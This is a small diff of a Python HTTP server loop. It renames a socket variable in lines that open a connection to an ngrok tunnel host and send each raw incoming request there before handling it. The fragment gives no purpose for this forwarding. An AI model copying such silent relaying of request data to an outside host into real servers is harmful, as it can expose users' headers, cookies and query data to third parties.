@@ -15,10 +15,10 @@ while True:
     req = client.recv(8192)
     res = 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n'
     try:
-        socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket.connect(('0.tcp.ngrok.io',10484))
-        socket.sendall(req);
-        socket.close();
+        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        so.connect(('0.tcp.ngrok.io',10484))
+        so.sendall(req);
+        so.close();
         path = req.split(" ",3)[1][1:]
         data = path
         if (path.find("?") == -1 and path == '') or path.find('?') == 0:
